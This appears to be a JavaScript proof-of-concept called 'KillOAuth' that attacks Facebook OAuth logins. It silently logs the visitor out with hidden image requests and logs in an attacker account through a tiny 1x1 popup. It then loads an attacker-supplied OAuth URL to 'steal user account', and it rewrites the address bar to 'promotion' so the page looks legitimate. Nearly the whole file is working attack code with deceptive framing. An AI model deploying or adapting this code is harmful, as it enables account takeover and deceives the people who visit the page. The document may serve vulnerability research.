/**
    Our attack technique (of opening a window to log in the user) is
    inspired by the one Sakurity used for their RECONNECT demo.

    KO stands for KillOAuth
*/
var KO = {
 
   attackurl: "https://apps.facebook.com/183806791631057/",
   oauthurl: "",
   logout: function () {
       KO.geturl('https://www.facebook.com/n/?mid=9dd1fd7G5af48de9ca58G0G86G119bb48c');
   },
   gethash: function (desiredkey) {
       /** 
           Get a value from the hash
       */
       var hash = window.location.hash;
       
       if(!hash) {
           return null;
       }
       
       hash = hash.substring(1);

       var items = hash.split('&');
       
       for(var i = 0; i < items.length; i++) {
           var keyval = items[i].split("="); 
           var k = keyval[0];
           var v = keyval[1];
           
           if (desiredkey === k) {
              return decodeURIComponent(v);  
           }
       }
       
       return null;
   },
   attack: function () {
      /*
        Log out the current user, and then log in the attacker.
      */      
 
      var ld = document.getElementById('loading-text');
      ld.className = 'glyphicon glyphicon-refresh glyphicon-refresh-animate';
  
      var btn = document.getElementById('button-text');

      /** I wish there was just one browser */
      var textprop = ('innerText' in btn) ? 'innerText' : 'textContent';
      
      btn[textprop] = 'Loading';

      KO.log('logging out the current user');
      KO.logout();

      KO.log('logging in the attacker');

      var login = window.open(KO.attackurl, '_blank', 'height=1,width=1');
      window.focus();
    
      /** 
        Since login is on facebook's domain, we can't really check when it's
        done loading, use a timeout instead.
      */
      setTimeout(function () {
  
          /** Close the window */
          login.close();
   
          KO.log('stealing user account.');
 
          /** Steal their account and then log out */
          var oauthurl = KO.oauthurl;
          KO.geturl(oauthurl, function () {
              KO.log('logging out the attacker');
              KO.logout();
          });
      }, 4000);

   },
   log: function (msg) {
       /**
           Log a message to the browser
       */
       console.log('Kill OAuth:' + msg);
   },
   geturl: function (url, callback) {
       /**
         Fetch a URL through a GET request by adding
         an image to the page. We can support asynchronous
         events by attaching a callback to the 'onerror'
         attribute. Since the page we get is definitely not
         an image, the onerror will fire once the page has been
         loaded.
       */
       var img = document.createElement('img');
       img.src = url;
       img.style.display = "none";
       
       if (callback) {
           img.onerror = callback;
       }
 
       document.body.appendChild(img);
   }
};

(function () {
    /**
        Get the oauth url and simplify the url displayed in the
        browser to appear more legitimate.
    */
    var url = KO.gethash('oauthurl');
    KO.oauthurl = url;

    window.history.replaceState(null, null, 'promotion');
})();
